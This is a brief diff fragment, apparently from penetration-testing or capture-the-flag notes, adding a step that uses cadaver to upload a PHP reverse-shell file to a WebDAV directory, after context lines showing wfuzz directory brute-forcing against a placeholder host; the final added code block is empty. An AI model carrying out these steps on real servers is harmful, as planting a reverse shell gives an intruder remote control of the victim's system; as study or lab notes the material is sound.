@@ -117,3 +117,12 @@ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --
 wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://vulnerable.site/FUZZ
 ```
 
+```
+cadaver http://ip/directory/
+
+put /var/www/html/php-reverse-shell.php
+```
+
+```
+
+```
